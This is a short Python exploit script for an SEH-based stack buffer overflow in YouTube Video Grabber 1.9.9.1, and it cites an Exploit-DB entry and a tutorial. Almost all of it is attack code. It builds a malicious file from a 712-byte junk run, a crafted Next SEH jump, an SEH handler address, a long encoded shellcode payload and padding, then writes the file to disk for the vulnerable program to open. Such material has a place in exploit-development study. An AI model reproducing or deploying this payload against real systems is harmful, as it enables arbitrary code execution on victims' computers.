'''
Description: YouTube Video Grabber 1.9.9.1 - Buffer Overflow (SEH)
Existing Exploit: https://www.exploit-db.com/exploits/50471
Tutorial: https://redtm.com/docs/exploit-dev/seh-base-stack-overflow-exploit/
'''

junk = b"A"* 712
buf =  b""
buf += b"\x89\xe1\xd9\xc7\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x38\x68\x6e"
buf += b"\x62\x73\x30\x57\x70\x73\x30\x31\x70\x4e\x69\x68\x65"
buf += b"\x75\x61\x6b\x70\x71\x74\x4c\x4b\x76\x30\x46\x50\x6e"
buf += b"\x6b\x42\x72\x46\x6c\x4e\x6b\x32\x72\x52\x34\x6e\x6b"
buf += b"\x30\x72\x66\x48\x64\x4f\x6f\x47\x61\x5a\x51\x36\x74"
buf += b"\x71\x59\x6f\x4e\x4c\x75\x6c\x75\x31\x43\x4c\x76\x62"
buf += b"\x64\x6c\x35\x70\x79\x51\x5a\x6f\x36\x6d\x33\x31\x39"
buf += b"\x57\x38\x62\x68\x72\x32\x72\x51\x47\x4e\x6b\x66\x32"
buf += b"\x42\x30\x4e\x6b\x33\x7a\x35\x6c\x4c\x4b\x30\x4c\x37"
buf += b"\x61\x73\x48\x78\x63\x51\x58\x55\x51\x78\x51\x76\x31"
buf += b"\x4e\x6b\x72\x79\x75\x70\x43\x31\x38\x53\x4e\x6b\x61"
buf += b"\x59\x42\x38\x58\x63\x45\x6a\x70\x49\x6e\x6b\x76\x54"
buf += b"\x4c\x4b\x76\x61\x5a\x76\x35\x61\x59\x6f\x4c\x6c\x39"
buf += b"\x51\x58\x4f\x76\x6d\x53\x31\x79\x57\x44\x78\x49\x70"
buf += b"\x64\x35\x6c\x36\x75\x53\x51\x6d\x68\x78\x45\x6b\x43"
buf += b"\x4d\x35\x74\x44\x35\x79\x74\x50\x58\x6e\x6b\x66\x38"
buf += b"\x67\x54\x67\x71\x69\x43\x33\x56\x4e\x6b\x76\x6c\x42"
buf += b"\x6b\x4c\x4b\x52\x78\x47\x6c\x73\x31\x69\x43\x6c\x4b"
buf += b"\x75\x54\x6c\x4b\x45\x51\x5a\x70\x4f\x79\x50\x44\x46"
buf += b"\x44\x44\x64\x31\x4b\x33\x6b\x43\x51\x31\x49\x70\x5a"
buf += b"\x42\x71\x49\x6f\x49\x70\x31\x4f\x71\x4f\x61\x4a\x4c"
buf += b"\x4b\x32\x32\x38\x6b\x4e\x6d\x61\x4d\x73\x58\x65\x63"
buf += b"\x35\x62\x43\x30\x73\x30\x50\x68\x31\x67\x30\x73\x36"
buf += b"\x52\x43\x6f\x31\x44\x45\x38\x42\x6c\x51\x67\x45\x76"
buf += b"\x63\x37\x79\x6f\x38\x55\x6c\x78\x7a\x30\x76\x61\x57"
buf += b"\x70\x53\x30\x57\x59\x79\x54\x70\x54\x32\x70\x31\x78"
buf += b"\x61\x39\x4b\x30\x42\x4b\x55\x50\x4b\x4f\x6b\x65\x36"
buf += b"\x30\x32\x70\x50\x50\x50\x50\x63\x70\x76\x30\x61\x50"
buf += b"\x42\x70\x32\x48\x6b\x5a\x56\x6f\x59\x4f\x4d\x30\x69"
buf += b"\x6f\x78\x55\x4d\x47\x71\x7a\x36\x65\x31\x78\x59\x50"
buf += b"\x4e\x48\x43\x31\x77\x61\x50\x68\x57\x72\x55\x50\x64"
buf += b"\x45\x56\x59\x4d\x59\x4d\x36\x32\x4a\x42\x30\x31\x46"
buf += b"\x71\x47\x50\x68\x6e\x79\x4d\x75\x51\x64\x33\x51\x39"
buf += b"\x6f\x49\x45\x4b\x35\x79\x50\x44\x34\x66\x6c\x69\x6f"
buf += b"\x52\x6e\x44\x48\x53\x45\x7a\x4c\x50\x68\x5a\x50\x6e"
buf += b"\x55\x6e\x42\x30\x56\x6b\x4f\x59\x45\x75\x38\x73\x53"
buf += b"\x30\x6d\x45\x34\x35\x50\x4f\x79\x48\x63\x63\x67\x56"
buf += b"\x37\x32\x77\x76\x51\x78\x76\x71\x7a\x66\x72\x32\x79"
buf += b"\x36\x36\x68\x62\x39\x6d\x43\x56\x6b\x77\x62\x64\x66"
buf += b"\x44\x65\x6c\x77\x71\x55\x51\x4e\x6d\x70\x44\x61\x34"
buf += b"\x56\x70\x48\x46\x67\x70\x71\x54\x36\x34\x66\x30\x32"
buf += b"\x76\x50\x56\x76\x36\x33\x76\x31\x46\x42\x6e\x63\x66"
buf += b"\x76\x36\x43\x63\x73\x66\x55\x38\x62\x59\x5a\x6c\x65"
buf += b"\x6f\x6f\x76\x6b\x4f\x7a\x75\x6c\x49\x6b\x50\x70\x4e"
buf += b"\x51\x46\x61\x56\x79\x6f\x46\x50\x30\x68\x54\x48\x6d"
buf += b"\x57\x55\x4d\x61\x70\x6b\x4f\x68\x55\x4f\x4b\x59\x70"
buf += b"\x45\x4d\x44\x6a\x67\x7a\x50\x68\x4f\x56\x6f\x65\x6d"
buf += b"\x6d\x4f\x6d\x49\x6f\x6b\x65\x77\x4c\x53\x36\x61\x6c"
buf += b"\x67\x7a\x6f\x70\x69\x6b\x69\x70\x32\x55\x55\x55\x6d"
buf += b"\x6b\x33\x77\x54\x53\x50\x72\x52\x4f\x42\x4a\x45\x50"
buf += b"\x56\x33\x49\x6f\x69\x45\x41\x41"
    
buffer = junk
buffer += b"\xeb\x06\x90\x90" #Next SEH
buffer += b"\x23\xc1\xc5\x01" #SEH
buffer +=buf
pad = b"C"*(9000-len(buffer)) 

createFile = open('testing.txt',"wb")
createFile.write(buffer+pad)
createFile.close()
